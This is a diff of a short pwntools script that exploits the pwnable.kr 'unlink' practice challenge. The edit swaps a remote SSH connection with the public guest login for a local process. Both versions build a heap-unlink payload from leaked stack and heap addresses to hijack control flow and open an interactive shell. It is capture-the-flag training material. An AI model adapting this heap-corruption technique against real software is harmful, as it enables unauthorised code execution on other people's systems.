@@ -1,19 +1,18 @@
 from pwn import *
 
-ssh_connection = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
+context.log_level = 'debug'
+p = process("/home/unlink/unlink")
 
-process = ssh_connection.process('/home/unlink/unlink')
+stack_leak = int(p.recvline().decode().split()[-1], 16)
+heap_leak = int(p.recvline().decode().split()[-1], 16)
 
-function = p32(0x080484eb)
+print(stack_leak, heap_leak)
 
-pad = b'a' * 12
+shell_addr = 0x80491d6
+ebp_stack_addr = stack_leak - 28
+a_buf_addr = heap_leak + 8
 
-back = p32(int(process.recvline().decode().split()[-1], 16) + 0x10) # Stack address plus 0x10
-front = p32(int(process.recvline().decode().split()[-1], 16) + 12)  # heap address plus 12
+payload = p32(shell_addr) + b'a' * 4 + p32(a_buf_addr + 4) + b'a' * 12 + p32(a_buf_addr + 16) + p32(ebp_stack_addr)
+p.sendline(payload)
 
-payload = function + pad + front + back
-
-process.recvline() #  Remove the extra message
-process.sendline(payload)
-
-process.interactive()
+p.interactive()
